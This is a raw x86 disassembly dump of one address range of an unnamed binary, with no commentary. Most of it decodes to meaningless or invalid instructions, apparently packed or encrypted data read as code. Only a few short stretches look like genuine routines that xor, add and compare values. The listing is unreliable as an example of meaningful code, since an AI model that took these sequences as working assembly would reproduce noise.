  40aefa:	mov    edi,0xfa579c85
  40aeff:	jbe    0x40aecc
  40af01:	out    dx,al
  40af02:	pop    ds
  40af03:	jns    0x40af79
  40af05:	mov    ch,0x5a
  40af07:	arpl   WORD PTR [esi+0x45737eb0],di
  40af0d:	arpl   WORD PTR ds:0x61bba6af,di
  40af13:	xchg   ebp,eax
  40af14:	or     eax,DWORD PTR [eax+0x586147c5]
  40af1a:	out    dx,eax
  40af1b:	ins    BYTE PTR es:[edi],dx
  40af1c:	rcr    esi,0x53
  40af1f:	mov    cl,0x7c
  40af21:	mov    dl,0x17
  40af23:	cmp    edi,eax
  40af25:	push   ebx
  40af26:	arpl   bx,sp
  40af28:	dec    ebp
  40af29:	repz sbb esi,DWORD PTR ds:0x1dc57f7e
  40af30:	nop
  40af31:	push   ecx
  40af32:	xchg   DWORD PTR [eax],edx
  40af34:	test   BYTE PTR [esi-0x160e9a5e],cl
  40af3a:	add    bl,BYTE PTR [ecx]
  40af3c:	out    0xe6,eax
  40af3e:	jno    0x40af66
  40af40:	push   0xffffffb8
  40af42:	adc    ebp,DWORD PTR [ecx+0x5c3b053f]
  40af48:	lds    ebx,FWORD PTR [edi]
  40af4a:	inc    ecx
  40af4b:	sbb    ebx,0x27
  40af4e:	inc    ebp
  40af4f:	xchg   edx,eax
  40af50:	or     DWORD PTR [edx],edx
  40af52:	fiadd  WORD PTR [edi]
  40af54:	push   ss
  40af55:	mov    bl,BYTE PTR [ecx+0x3a]
  40af58:	popf   
  40af59:	mov    WORD PTR [ecx],ds
  40af5b:	sub    dl,BYTE PTR [eax+0x3f]
  40af5e:	icebp  
  40af5f:	xchg   ebp,eax
  40af60:	in     al,0x4
  40af62:	jecxz  0x40af6f
  40af64:	xor    eax,0x9d4f4429
  40af69:	and    eax,0x27a99579
  40af6e:	add    edi,DWORD PTR [ebx+0x73]
  40af71:	mov    eax,ds:0xdc512ee4
  40af76:	jno    0x40af55
  40af78:	add    eax,0xfd4b33eb
  40af7d:	retf   0xba11
  40af80:	push   esp
  40af81:	mul    BYTE PTR [ebx+0x20]
  40af84:	fldcw  WORD PTR [ecx]
  40af86:	inc    esi
  40af87:	sub    bh,dl
  40af89:	lods   eax,DWORD PTR ds:[esi]
  40af8a:	mov    BYTE PTR [edi],al
  40af8c:	jne    0x40af21
  40af8e:	int    0x35
  40af90:	ret    
  40af91:	mov    esi,0x9202c654
  40af96:	mov    eax,ds:0x3ca02dfb
  40af9b:	xor    eax,0xccd1a9c5
  40afa0:	rol    BYTE PTR ds:0xaaa7b835,cl
  40afa6:	mov    esp,0x72947084
  40afab:	cdq    
  40afac:	xor    ebx,edx
  40afae:	aad    0x90
  40afb0:	shl    DWORD PTR [eax+0x6b],1
  40afb3:	mov    esp,edx
  40afb5:	xchg   edi,eax
  40afb6:	fst    QWORD PTR [esi-0x37]
  40afb9:	ins    DWORD PTR es:[edi],dx
  40afba:	sub    DWORD PTR [ebp+0x588cdbc0],esp
  40afc0:	int    0x1f
  40afc2:	jo     0x40aff2
  40afc4:	push   ss
  40afc5:	in     eax,dx
  40afc6:	mov    WORD PTR [edi+ebp*2+0x1],es
  40afca:	xor    esp,ebp
  40afcc:	jbe    0x40affa
  40afce:	mov    DWORD PTR [ebp-0xc],ebx
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     ch,cl
  40aff8:	xchg   ebx,eax
  40aff9:	(bad)  
  40affb:	jns    0x40afe5
  40affd:	jle    0x40b07d
  40afff:	cs jge 0x40b080
  40b002:	jle    0x40afc7
  40b004:	push   esp
  40b005:	jle    0x40afae
  40b007:	fidiv  DWORD PTR [ecx]
  40b009:	les    ebp,FWORD PTR [edx+0x5f44c9a]
  40b00f:	pop    esi
  40b010:	sti    
  40b011:	jmp    0x2dac:0x459fe9c2
  40b018:	and    BYTE PTR [ebp+0x27a4ff5e],0x65
  40b01f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b020:	scas   eax,DWORD PTR es:[edi]
  40b021:	pop    edi
  40b022:	retf   
  40b023:	sub    al,0xaf
  40b025:	ins    DWORD PTR es:[edi],dx
  40b026:	div    edx
  40b028:	and    eax,0x258bde7c
  40b02d:	xchg   BYTE PTR [esi-0x19],cl
  40b030:	in     eax,0xa8
  40b032:	inc    esp
  40b033:	rcr    DWORD PTR [ebx],cl
  40b035:	inc    eax
  40b036:	push   ebx
  40b037:	sbb    dl,bh
  40b039:	and    al,0xf4
  40b03b:	sbb    al,0x14
  40b03d:	loop   0x40afc1
  40b03f:	into   
  40b040:	add    eax,0x28ec468c
  40b045:	hlt    
  40b046:	push   edi
  40b047:	xor    eax,0xd2f9e0c7
  40b04c:	inc    esi
  40b04d:	cwde   
  40b04e:	gs inc ebp
  40b050:	iret   
  40b051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b052:	and    BYTE PTR [eax],al
  40b054:	out    0x84,al
  40b056:	mov    eax,ds:0xba2b9eee
  40b05b:	out    dx,eax
  40b05c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b05d:	mov    ebp,ecx
  40b05f:	(bad)  
  40b060:	xchg   bp,ax
  40b062:	and    eax,0x80f13631
  40b067:	xor    eax,0x3b6747ce
  40b06c:	lods   eax,DWORD PTR ds:[esi]
  40b06d:	or     BYTE PTR [edx+0x248921e8],0xf8
  40b074:	lahf   
  40b075:	add    al,0x63
  40b077:	or     al,0x71
  40b079:	enter  0xb4f5,0x19
  40b07d:	aas    
  40b07e:	mov    al,ds:0xb54b6a56
  40b083:	cmp    cl,0x2
  40b086:	add    BYTE PTR [edi],cl
  40b088:	dec    ecx
  40b089:	inc    ebp
  40b08a:	hlt    
  40b08b:	or     DWORD PTR [esi+0x7a],ecx
  40b08e:	addr16 and bh,al
  40b091:	add    al,0x64
  40b093:	popa   
  40b094:	mov    al,ds:0x5ab17ee
  40b099:	push   ecx
  40b09a:	ds (bad) 
  40b09c:	pusha  
  40b09d:	push   edi
  40b09e:	lods   al,BYTE PTR ds:[esi]
  40b09f:	mov    al,ah
  40b0a1:	sbb    al,0xc7
  40b0a3:	mov    DWORD PTR [edi-0x64],0x46a623dd
  40b0aa:	push   0x76
  40b0ac:	pop    ds
  40b0ad:	fistp  DWORD PTR [edx+0x25146f86]
  40b0b3:	or     eax,0x9d260fea
  40b0b8:	lahf   
  40b0b9:	sbb    DWORD PTR [ebp-0x4a],0xfffffffb
  40b0bd:	sub    ebx,DWORD PTR [ebx-0x36]
  40b0c0:	xchg   esp,eax
  40b0c2:	clc    
  40b0c3:	and    eax,0x13c4f06c
  40b0c8:	inc    ecx
  40b0c9:	fnstcw WORD PTR [esi-0x58]
  40b0cc:	mov    dh,0xcf
  40b0ce:	push   esi
  40b0cf:	sbb    esp,esi
  40b0d1:	pop    ebx
  40b0d2:	jnp    0x40b0a1
  40b0d4:	outs   dx,BYTE PTR ds:[esi]
  40b0d5:	repz pop ss
  40b0d7:	retf   0x2945
  40b0da:	lods   al,BYTE PTR ds:[esi]
  40b0db:	jmp    0x6dac:0xacd85a93
  40b0e2:	(bad)
  40b0e5:	dec    ebp
  40b0e6:	(bad)  
  40b0e9:	and    eax,0xde2ce11b
  40b0ee:	fsubr  DWORD PTR [edi+0xc62f075]
  40b0f4:	int3   
  40b0f5:	rcr    BYTE PTR [ebx-0x5ac40a32],1
  40b0fb:	scas   al,BYTE PTR es:[edi]
  40b0fc:	mov    eax,ds:0xfd95bb9b
  40b101:	mov    esi,0xd59d4233
  40b106:	retf   
  40b107:	push   ebx
  40b108:	cwde   
  40b109:	and    DWORD PTR [eax],edx
  40b10b:	stos   BYTE PTR es:[edi],al
  40b10c:	cld    
  40b10d:	outs   dx,BYTE PTR ds:[esi]
  40b10e:	cmp    al,BYTE PTR [esi+ebx*8-0x27]
  40b112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b113:	dec    ebx
  40b114:	pop    esp
  40b115:	cmc    
  40b116:	xor    DWORD PTR [eax+0x1903773],edi
  40b11c:	sub    DWORD PTR [ebp+0x7c],edi
  40b11f:	dec    ebx
  40b120:	int3   
  40b121:	add    eax,0xc6235946
  40b126:	adc    esi,ebx
  40b128:	cmovl  ebp,ebx
  40b12b:	xchg   ecx,eax
  40b12c:	xor    eax,0xde95f870
  40b132:	loopne 0x40b114
  40b134:	mov    ch,0x6f
  40b136:	retf   
  40b137:	cli    
  40b138:	shr    BYTE PTR [ecx],cl
  40b13a:	sbb    ah,BYTE PTR [eax+0x6aea0dbb]
  40b140:	call   0x140e:0x7a95361f
  40b147:	into   
  40b148:	pop    ebx
  40b149:	mov    edi,0x6d978524
  40b14e:	cmc    
  40b14f:	sub    DWORD PTR [ebx-0x472eed73],eax
  40b155:	mov    esi,0xe1b6f655
  40b15a:	or     al,0x2d
  40b15c:	lea    edi,[edi+edi*4+0x36]
  40b160:	in     al,0xb2
  40b162:	and    eax,0xafaa8762
  40b167:	js     0x40b18f
  40b169:	xchg   BYTE PTR [eax+0x60],bh
  40b16c:	cmp    BYTE PTR [ebp+0x43],bl
  40b16f:	dec    esi
  40b170:	outs   dx,BYTE PTR ds:[esi]
  40b171:	mov    ds:0x49bfb1e4,al
  40b176:	std    
  40b177:	inc    ebx
  40b178:	push   cs
  40b179:	(bad)  
  40b17a:	(bad)  
  40b17b:	lahf   
  40b17c:	xlat   BYTE PTR ds:[ebx]
  40b17d:	jg     0x40b14d
  40b17f:	in     al,dx
  40b180:	pop    eax
  40b181:	jbe    0x40b11a
  40b183:	test   eax,0xb61bed01
  40b188:	adc    ebp,DWORD PTR [edi]
  40b18a:	pushf  
  40b18b:	mov    eax,ss
  40b18d:	mov    cl,0x3a
  40b18f:	aam    0x78
  40b191:	sbb    ebp,DWORD PTR ds:0x5a5f12b
  40b197:	mov    ebp,esi
  40b199:	sbb    DWORD PTR [ebx-0x4c62c4dc],edi
  40b19f:	imul   esp,esi,0xac8136f
  40b1a5:	jmp    0x5df7234f
  40b1aa:	cbw    
  40b1ac:	mov    esi,DWORD PTR [edx]
  40b1ae:	push   esi
  40b1af:	or     BYTE PTR [ebx-0x22ae134b],cl
  40b1b5:	xlat   BYTE PTR ds:[ebx]
  40b1b6:	mov    ecx,0x106c213b
  40b1bb:	std    
  40b1bc:	aam    0x62
  40b1be:	sub    eax,0x135333dc
  40b1c3:	call   0x85c3cd19
  40b1c8:	fbld   TBYTE PTR [ebx+0x7a]
  40b1cb:	lock xchg edx,eax
  40b1cd:	mov    ebp,0x451d7cea
  40b1d2:	scas   al,BYTE PTR es:[edi]
  40b1d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1d4:	(bad)  
  40b1d5:	popa   
  40b1d6:	rol    ecx,1
  40b1d8:	sbb    BYTE PTR [edx+0x52],ah
  40b1db:	and    DWORD PTR [ebx],ebp
  40b1dd:	or     eax,ebp
  40b1df:	retf   
  40b1e0:	add    DWORD PTR [edi],0xd1ac7b4c
  40b1e6:	in     al,0x76
  40b1e8:	inc    esp
  40b1e9:	push   DWORD PTR [ecx+0x620d1d31]
  40b1ef:	dec    edx
  40b1f0:	jno    0x40b1fb
  40b1f2:	adc    BYTE PTR [esi],ah
  40b1f4:	cmp    eax,DWORD PTR [edx+0x255469d7]
  40b1fa:	je     0x40b18b
  40b1fc:	xchg   ecx,eax
  40b1fd:	jbe    0x40b241
  40b1ff:	mov    edx,DWORD PTR [esi+0x4008cee0]
  40b205:	sub    bl,BYTE PTR [esi+0x59]
  40b208:	add    ebp,ebp
  40b20a:	mov    ebp,0x93fa9ab5
  40b20f:	lahf   
  40b210:	mov    esp,DWORD PTR [ebx+edi*2-0x7c]
  40b214:	jl     0x40b218
  40b216:	xchg   ebp,eax
  40b217:	test   al,bh
  40b219:	mov    bl,0xf4
  40b21b:	or     al,0x81
  40b21d:	lods   al,BYTE PTR ds:[esi]
  40b21e:	out    dx,eax
  40b21f:	iret   
  40b220:	icebp  
  40b221:	and    DWORD PTR [edi],0xffffffa3
  40b224:	iret   
  40b225:	add    eax,0x84e8c763
  40b22a:	dec    eax
  40b22b:	test   al,0xce
  40b22d:	jmp    0xbbd2d6e8
  40b232:	jmp    0xdcefebf7
  40b237:	sar    DWORD PTR [edx],0x73
  40b23a:	jecxz  0x40b22a
  40b23c:	add    esp,DWORD PTR [esi]
  40b23e:	mov    eax,ds:0x6ac75144
  40b243:	adc    BYTE PTR [ebp+0x17],ch
  40b246:	(bad)  
  40b247:	loop   0x40b242
  40b249:	je     0x40b2ba
  40b24b:	or     BYTE PTR [edi+0x17],0x82
  40b24f:	inc    esi
  40b250:	sar    BYTE PTR [eax+0x203de43b],0xb8
  40b257:	lds    eax,FWORD PTR [eax+0x5]
  40b25a:	lea    ecx,[ebx]
  40b25c:	ret    0xe9b2
  40b25f:	adc    eax,0xed8d966a
  40b264:	jp     0x40b279
  40b266:	cmp    al,0xa
  40b268:	outs   dx,DWORD PTR ds:[esi]
  40b269:	xor    eax,0xc7722afa
  40b26e:	adc    DWORD PTR [ebp+0xfb0cece],edx
  40b274:	addr16 pusha 
  40b276:	out    dx,eax
  40b277:	hlt    
  40b278:	loop   0x40b2cf
  40b27a:	mov    ebp,0x3de1f96d
  40b27f:	jmp    0x8857:0x86d4bff5
  40b286:	shl    DWORD PTR [esi+0x63c456d7],1
  40b28c:	loopne 0x40b304
  40b28e:	das    
  40b28f:	jbe    0x40b297
  40b291:	addr16 sbb al,0xa
  40b294:	pop    edi
  40b295:	hlt    
  40b296:	and    al,0xa1
  40b298:	in     eax,0xca
  40b29a:	push   esp
  40b29b:	mov    esp,0xbd812241
  40b2a0:	and    ecx,ebx
  40b2a2:	mov    ecx,edx
  40b2a4:	(bad)  
  40b2a5:	aas    
  40b2a6:	leave  
  40b2a7:	ins    DWORD PTR es:[edi],dx
  40b2a8:	xor    BYTE PTR [eax+0x53],ch
  40b2ab:	and    DWORD PTR [esi+0x36],esi
  40b2ae:	xor    DWORD PTR [esp+eax*8],ebp
  40b2b1:	xlat   BYTE PTR ss:[ebx]
  40b2b3:	enter  0x661,0xae
  40b2b7:	and    eax,DWORD PTR [edx+ecx*4+0x70]
  40b2bb:	adc    esi,esp
  40b2bd:	mov    ebp,0xbf820cc0
  40b2c2:	or     BYTE PTR [ecx+0x26f7022b],ah
  40b2c8:	mov    edx,?
  40b2ca:	mov    cl,0x9c
  40b2cc:	cdq    
  40b2cd:	pop    esi
  40b2ce:	cmc    
  40b2cf:	fsubr  st,st(0)
  40b2d1:	add    al,0x2b
  40b2d3:	test   BYTE PTR [eax],ah
  40b2d5:	mov    ch,0xd9
  40b2d7:	(bad)  
  40b2d8:	pushf  
  40b2d9:	sub    edx,DWORD PTR [edx]
  40b2db:	jg     0x40b2a5
  40b2dd:	lods   al,BYTE PTR ds:[esi]
  40b2de:	push   edi
  40b2df:	scas   eax,DWORD PTR es:[edi]
  40b2e0:	gs aaa 
  40b2e2:	stc    
  40b2e3:	adc    DWORD PTR [edx-0x18eaeee7],eax
  40b2e9:	and    DWORD PTR [eax+eax*2+0x65d111db],eax
  40b2f0:	cmc    
  40b2f1:	cmp    BYTE PTR [eax],al
  40b2f3:	xor    BYTE PTR [eax+0x5b],0x32
  40b2f7:	dec    ebx
  40b2f8:	sbb    bl,BYTE PTR [ecx-0x18]
  40b2fb:	xor    eax,0x79d3b94c
  40b300:	icebp  
  40b301:	mov    ebp,0xf310aeef
  40b306:	mul    BYTE PTR [ebx]
  40b308:	in     al,0xd8
  40b30a:	int3   
  40b30b:	imul   esi,DWORD PTR [ebx],0x1e
  40b30e:	or     BYTE PTR [eax],ch
  40b310:	pop    esi
  40b311:	sbb    eax,0x1c1fec34
  40b316:	lea    eax,[ecx-0x6f]
  40b319:	or     BYTE PTR [eax+0x6eeaf567],dh
  40b31f:	inc    ecx
  40b320:	push   cs
  40b321:	and    eax,0x4debbf5d
  40b326:	xor    DWORD PTR [bx+si+0x4157],edi
  40b32b:	xor    DWORD PTR [edx],edx
  40b32d:	imul   ecx,edx,0x32e85163
  40b333:	mov    eax,DWORD PTR [ebp+0x8]
  40b336:	mov    ecx,DWORD PTR [ebp-0x8]
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	das    
  40b375:	mov    bh,0xb6
  40b377:	inc    ecx
  40b378:	sub    edi,esi
  40b37a:	jle    0x40b3fa
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b392
  40b381:	mov    dh,0x3a
  40b383:	test   al,0xe
  40b385:	xor    DWORD PTR [ecx+edi*4],ebx
  40b388:	fdivr  DWORD PTR [ebx+0x27]
  40b38b:	sub    DWORD PTR [ebx-0x36],ebp
  40b38e:	or     dh,bh
  40b390:	pop    ss
  40b391:	out    0xbc,eax
  40b393:	fstp   QWORD PTR [ecx]
  40b395:	mov    edx,0x8f562a46
  40b39a:	adc    al,ch
  40b39c:	ficomp DWORD PTR [edi+esi*4-0x74]
  40b3a0:	sub    ebp,DWORD PTR [ecx-0x57]
  40b3a3:	push   0x207b14c0
  40b3a8:	retf   0x8
  40b3ab:	rcr    esi,1
  40b3ad:	mov    bl,cl
  40b3af:	mov    esp,0x6721738e
  40b3b4:	jmp    0x40b395
  40b3b6:	(bad)  
  40b3b7:	inc    ecx
  40b3b8:	test   eax,0x9db70793
  40b3bd:	mov    al,0x6c
  40b3bf:	cmp    eax,0x7dccf3e2
  40b3c4:	pusha  
  40b3c5:	shl    BYTE PTR [ebp+0x4e],0xea
  40b3c9:	jae    0x40b429
  40b3cb:	arpl   WORD PTR [edi],sp
  40b3cd:	mov    al,ds:0x57902235
  40b3d2:	repnz mov bl,0x64
  40b3d5:	leave  
  40b3d6:	lock adc BYTE PTR [ebx],bh
  40b3d9:	loopne 0x40b3ba
  40b3db:	scas   al,BYTE PTR es:[edi]
  40b3dc:	jno    0x40b427
  40b3de:	or     al,0x89
  40b3e0:	inc    DWORD PTR [ecx+0x5e2db27a]
  40b3e6:	mov    eax,ds:0x9df8c1e3
  40b3eb:	dec    esi
  40b3ec:	mov    BYTE PTR [edi+0x21751093],bl
  40b3f2:	jae    0x40b40d
  40b3f4:	pop    esi
  40b3f5:	cmp    eax,0x223c5c5d
  40b3fa:	cmp    eax,0x70248fc3
  40b3ff:	dec    edx
  40b400:	lock add BYTE PTR [eax],cl
  40b403:	or     bl,dl
  40b405:	nop    DWORD PTR [eax]
  40b408:	add    BYTE PTR [ebx],dh
  40b40a:	jmp    0xf57:0x790ed2a2
  40b411:	call   0xd3b9:0xccdc025f
  40b418:	mov    ds:0x971457df,eax
  40b41d:	mov    WORD PTR [ebx-0x25],ss
  40b420:	fsubr  QWORD PTR [ebp+0x43]
  40b423:	cmp    al,0xf8
  40b425:	shl    BYTE PTR [edi],1
  40b427:	imul   edx,DWORD PTR [edi],0x12
  40b42a:	and    eax,0x477b3797
  40b42f:	ins    DWORD PTR es:[edi],dx
  40b430:	outs   dx,BYTE PTR ds:[esi]
  40b431:	cmp    BYTE PTR [eax],ch
  40b433:	and    dh,BYTE PTR [edi+ebx*8]
  40b436:	lods   eax,DWORD PTR ds:[esi]
  40b437:	sahf   
  40b438:	pop    edi
  40b439:	mov    ah,0x8a
  40b43b:	int    0x96
  40b43d:	pop    esp
  40b43e:	ret    0x8d79
  40b441:	or     esi,DWORD PTR [ecx+ebp*2+0x56914e6f]
  40b448:	xchg   DWORD PTR [bp+si],edi
  40b44b:	lds    eax,FWORD PTR [edx+0x7deb9b55]
  40b451:	retf   0x8aa6
  40b454:	jge    0x40b485
  40b456:	aaa    
  40b457:	inc    ebx
  40b458:	xor    DWORD PTR [ebp+0x68],edx
  40b45b:	push   es
  40b45c:	jg     0x40b497
  40b45e:	and    dl,BYTE PTR [ebx+0x69]
  40b461:	lds    edi,FWORD PTR [esi-0x33e768b9]
  40b467:	sar    BYTE PTR ds:0xc65c9873,cl
  40b46d:	test   DWORD PTR [ecx+ebx*1],ebx
  40b470:	add    ah,0xf2
  40b473:	rcl    BYTE PTR [esi+0x5d],cl
  40b476:	sbb    DWORD PTR [bx-0x34],edx
  40b47a:	and    al,0xa9
  40b47c:	outs   dx,DWORD PTR ds:[esi]
  40b47d:	pop    edx
  40b47e:	adc    edi,DWORD PTR [edx]
  40b480:	sbb    eax,0xef98552b
  40b485:	xor    esi,DWORD PTR [edi+0x5e]
  40b488:	cld    
  40b489:	mov    ebx,0x829ebeab
  40b48e:	repnz inc esp
  40b490:	dec    ebx
  40b491:	test   DWORD PTR [eax],edi
  40b493:	sub    eax,0x5a64a5cd
  40b498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b499:	stc    
  40b49a:	call   0xdab3:0x7fd87f2c
  40b4a1:	push   edi
  40b4a2:	out    dx,eax
  40b4a3:	scas   eax,DWORD PTR es:[edi]
  40b4a4:	push   0xe2f6ca69
  40b4a9:	mov    ds:0x8e531fa2,eax
  40b4ae:	sub    esi,DWORD PTR [edi]
  40b4b0:	cmp    eax,0xe5ffdeae
  40b4b5:	std    
  40b4b6:	and    al,0x75
  40b4b8:	sub    DWORD PTR [ecx+0x315d6c28],esp
  40b4be:	adc    WORD PTR [esp+ecx*1],bx
  40b4c2:	xor    ebp,DWORD PTR [eax-0x22]
  40b4c5:	sbb    bh,BYTE PTR [edx+0x2c]
  40b4c8:	ret    
  40b4c9:	or     DWORD PTR [ebx-0x17],ebx
  40b4cc:	in     eax,0x5d
  40b4ce:	dec    ebp
  40b4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4d0:	jae    0x40b4ec
  40b4d2:	in     al,0xd6
  40b4d4:	sub    eax,0x2c2b239d
  40b4d9:	mov    sp,0xa06f
  40b4dd:	inc    edi
  40b4de:	and    al,0xde
  40b4e0:	inc    esi
  40b4e1:	bound  edi,QWORD PTR [edx-0x3]
  40b4e4:	adc    al,bl
  40b4e6:	mov    cs,WORD PTR [edx+0x54]
  40b4e9:	outs   dx,DWORD PTR ds:[esi]
  40b4ea:	add    bl,BYTE PTR [eax-0x4e706086]
  40b4f0:	nop
  40b4f1:	iret   
  40b4f2:	int3   
  40b4f3:	xchg   esp,eax
  40b4f4:	dec    esp
  40b4f5:	pop    esi
  40b4f6:	push   cs
  40b4f7:	pusha  
  40b4f8:	inc    ebx
  40b4f9:	sub    al,0x77
  40b4fb:	jae    0x40b4b4
  40b4fd:	mov    eax,0xbbc3f93c
  40b502:	loopne 0x40b533
  40b504:	out    0x27,eax
  40b506:	mov    edx,0xb6956045
  40b50b:	dec    edx
  40b50c:	in     al,0x62
  40b50e:	popa   
  40b50f:	mov    esp,0x56c91e71
  40b514:	sub    al,0xac
  40b516:	xchg   ecx,eax
  40b517:	mov    edx,0x2c7a6d6b
  40b51c:	outs   dx,DWORD PTR ds:[esi]
  40b51d:	add    al,0xd7
  40b51f:	dec    esi
  40b520:	jae    0x40b560
  40b522:	mov    al,0x3f
  40b524:	adc    al,0xec
  40b526:	ror    ch,cl
  40b528:	pop    ecx
  40b529:	mov    ds:0x2b7698ad,eax
  40b52e:	int    0xf0
  40b530:	and    eax,DWORD PTR [edx-0x78]
  40b533:	mov    ah,0xe2
  40b535:	mov    ds:0x9c854347,eax
  40b53a:	add    ch,BYTE PTR [esi-0x70]
  40b53d:	cmp    DWORD PTR [esi-0x68],0x26b6d7ac
  40b544:	lea    ebx,[ebx-0x1c]
  40b547:	or     eax,0x78d068d7
  40b54c:	lock sar DWORD PTR [eax+0x5d],1
  40b550:	push   0x25
  40b552:	pop    edx
  40b553:	mov    esp,0xbd8667da
  40b558:	xchg   esi,eax
  40b559:	jb     0x40b516
  40b55b:	iret   
  40b55c:	inc    esp
  40b55d:	cld    
  40b55e:	push   ss
  40b55f:	adc    eax,0x7cebfa3c
  40b564:	xchg   esp,eax
  40b565:	cmp    DWORD PTR ds:0xdd596b91,eax
  40b56b:	sub    dh,BYTE PTR [edx]
  40b56d:	mov    edi,0x5dd43b24
  40b572:	jmp    0x92bc77bb
  40b577:	xor    ebp,DWORD PTR [edx-0x189a7fe6]
  40b57d:	xchg   ebp,eax
  40b57e:	xchg   edx,eax
  40b57f:	int    0x40
  40b581:	shr    DWORD PTR [ecx+0x73],cl
  40b584:	push   cs
  40b585:	stos   BYTE PTR es:[edi],al
  40b586:	mov    cl,0xfc
  40b588:	mov    BYTE PTR [ebp+0x1e93a08f],bh
  40b58e:	push   cs
  40b58f:	ret    
  40b590:	shr    ebx,0x2b
  40b593:	mov    BYTE PTR [esp+eiz*8-0x14],bh
  40b597:	rol    BYTE PTR [edi-0x3c],cl
  40b59a:	cdq    
  40b59b:	ins    BYTE PTR es:[edi],dx
  40b59c:	and    DWORD PTR [ecx-0x66],esp
  40b59f:	outs   dx,BYTE PTR ds:[esi]
  40b5a0:	or     DWORD PTR [esi],ebx
  40b5a2:	retf   0xb7c3
  40b5a5:	lahf   
  40b5a6:	leave  
  40b5a7:	mov    ch,0xd1
  40b5a9:	pushf  
  40b5aa:	pop    ss
  40b5ab:	add    al,0xc7
  40b5ad:	ins    DWORD PTR es:[edi],dx
  40b5ae:	daa    
  40b5af:	sahf   
  40b5b0:	fadd   QWORD PTR [edi]
  40b5b2:	xor    eax,0x3b408cf6
  40b5b7:	push   edx
  40b5b8:	jno    0x40b597
  40b5ba:	push   edx
  40b5bb:	sub    al,0x6a
  40b5bd:	mov    bl,0x1a
  40b5bf:	xchg   ebx,eax
  40b5c0:	add    BYTE PTR [edi-0x7fb1454e],0xf8
  40b5c7:	(bad)  
  40b5c8:	mov    WORD PTR [ecx-0x5d],fs
  40b5cb:	sbb    BYTE PTR [edx],ah
  40b5cd:	data16 fcomp QWORD PTR [eax]
  40b5d0:	lods   al,BYTE PTR ds:[esi]
  40b5d1:	mov    ds:0x3b01c1dc,eax
  40b5d6:	lds    esp,FWORD PTR [ebx]
  40b5d8:	jbe    0x40b5af
  40b5da:	add    DWORD PTR [ebp+ebx*2-0x6e],ecx
  40b5de:	loop   0x40b588
  40b5e0:	pop    esi
  40b5e1:	int3   
  40b5e2:	pop    edi
  40b5e3:	aam    0xf6
  40b5e5:	(bad)  
  40b5e6:	and    BYTE PTR [esi+0x34],cl
  40b5e9:	mov    eax,ds:0xa81fdf36
  40b5ee:	pop    ss
  40b5ef:	cwde   
  40b5f0:	adc    al,0x9d
  40b5f2:	dec    eax
  40b5f3:	and    eax,0x43627827
  40b5f8:	fdivr  st(4),st
  40b5fa:	out    dx,eax
  40b5fb:	mov    eax,ds:0x49daf70c
  40b600:	pop    es
  40b601:	std    
  40b602:	mov    ah,0xe4
  40b604:	xchg   ecx,eax
  40b605:	je     0x40b632
  40b607:	adc    bl,ah
  40b609:	or     al,0xb
  40b60b:	fldenv [eax+ebx*2+0x5b6ae88]
  40b612:	idiv   BYTE PTR [ebp-0x84e2ee]
  40b618:	pushf  
  40b619:	mov    ebx,0xd3a29b35
  40b61e:	or     ebp,DWORD PTR [edx+0x6f068919]
  40b624:	inc    ebp
  40b625:	xchg   DWORD PTR [edx+0x77],esi
  40b628:	or     eax,0x2afad6d8
  40b62d:	fwait
  40b62e:	cmp    ecx,0xdf7501e
  40b634:	shl    esp,0xa3
  40b637:	push   0xd77c97b8
  40b63c:	in     al,0x89
  40b63e:	and    esi,ebx
  40b640:	popa   
  40b641:	adc    ecx,DWORD PTR [edi-0x37eca3de]
  40b647:	mov    fs,WORD PTR [edi+edx*4]
  40b64a:	pusha  
  40b64b:	push   es
  40b64c:	ret    0x1bf3
  40b64f:	test   DWORD PTR [ebp-0x5c],0xf49b621
  40b656:	mov    dh,0xb4
  40b658:	ins    BYTE PTR es:[edi],dx
  40b659:	std    
  40b65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b65b:	out    dx,al
  40b65c:	mov    ch,0x64
  40b65e:	xor    DWORD PTR [ecx-0x515d38c9],ebp
  40b664:	rep outs dx,BYTE PTR ds:[esi]
  40b666:	mov    eax,0x79bcf59f
  40b66b:	or     ebp,DWORD PTR [edx+0x26335b0e]
  40b671:	int3   
  40b672:	lods   al,BYTE PTR ds:[esi]
  40b673:	cmp    esi,DWORD PTR [ebx+edi*1-0x48]
  40b677:	adc    dh,BYTE PTR [eax]
  40b679:	sub    esp,DWORD PTR [edx+0x2f]
  40b67c:	cmp    DWORD PTR [edi-0x25],edi
  40b67f:	jg     0x40b607
  40b681:	dec    edx
  40b682:	sbb    DWORD PTR [esi],edx
  40b684:	add    al,0x2d
  40b686:	and    BYTE PTR [ebx+0x43],bl
